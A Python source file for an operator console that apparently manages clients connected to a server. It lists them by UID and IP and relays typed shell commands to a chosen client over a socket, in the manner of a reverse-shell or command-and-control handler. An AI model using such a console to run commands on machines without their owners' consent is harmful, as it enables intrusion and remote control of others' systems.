try:
    import json, os, platform, re, socket, sys
    from core.server import Server
    from core.env import Env
except ImportError as err:
    print(err)

class Console(object):

    def __init__(self):
        self.prompt = '{hostname}@{user}> '.format(hostname=platform.node(),
                                                   user=os.getlogin())
        self.server = Server()
        self.ifs    = ' '
        self.regex  = re.compile(self.ifs)
        try:
            with open(os.path.abspath(Env.CMDS_PATH.value),'r') as fs:
                self.cmds = json.loads(fs.read())
        except json.JSONDecodeError as err:
            print(err)
            sys.exit()
        except IOError as err:
            print(err)
            sys.exit()
        self.running = True

    def run(self):
        self.server.start()
		
        while self.running:
            try:
                raw_cmd = input(self.prompt)
                if len(raw_cmd):
                    parse_raw_cmd = self.regex.split(raw_cmd)
                    cmd           = self.cmds[parse_raw_cmd[0]]
                    if cmd['name'] == 'exit':
                        if len(self.server.clients):
                            output = 'close'
                            for client in self.server.clients.values():
                                client.socket.send(output.encode())
                                client.socket.close()
                                client.running.clear()
                        self.server.socket.close()
                        self.server.running.clear()
                        self.running = False
                    elif cmd['name'] == 'help':
                        self.help(parse_raw_cmd)
                    elif cmd['name'] == 'list':
                        self.list()
                    elif cmd['name'] == 'shell':
                        self.shell(parse_raw_cmd)
            except KeyError:
                output = 'Invalid command: {cmd}'.format(cmd=raw_cmd)
                print(output)
            except KeyboardInterrupt:
                if len(self.server.clients):
                    output = 'close'
                    for client in self.server.clients.values():
                        client.socket.send(output.encode())
                        client.socket.close()
                        client.running.clear()
                self.server.socket.close()
                self.server.running.clear()
                self.running = False
        sys.exit()

    def help(self, command):
        if len(command) > 1:
            for _ in command[1:]:
                try:
                    print(''.join('Name: {name}\nDescription: {description}\nUsage: {usage}'.format(name=self.cmds[_]['name'],
                                                                                                    description=self.cmds[_]['description'],
                                                                                                    usage=self.cmds[_]['usage'])))
                except KeyError:
                    pass
        else:
            print(''.join(['Available commands: ', str([_ for _ in self.cmds.keys()])]))
	
    def list(self):
        if len(self.server.clients):
            print('UID\t\t\t\tIP')
            print('---\t\t\t\t--')
            for uid, client in self.server.clients.items():
                print(''.join('{uid}\t{ip}'.format(uid=uid,
                                                  ip=client.ip)))
        else:
            print('No client available.')

	
    def shell(self, command):
        if len(command) > 1:
            try:
                client = self.server.clients[command[1]]
                while True:
                    try:
                        raw_cmd = input('{uid}> '.format(uid=command[1]))
                        if raw_cmd == 'exit':
                            break
                        else:
                            if raw_cmd == 'close':
                                client.socket.send(raw_cmd.encode())
                                client.running.clear()
                                client.socket.close()
                                del self.server.clients[command[1]]
                                break
                            else:
                                client.socket.send(raw_cmd.encode())
                    except socket.error:
                        client.running.clear()
                        client.socket.close()
                        del self.server.clients[command[1]]
                        break
            except KeyError:
                print('Invalid uid: {cmd} {uid}'.format(cmd=command[0],
                                                        uid=command[1]))
        else:
            print('Invalid uid: {cmd} {uid}'.format(cmd=command[0],
                                                    uid=''))

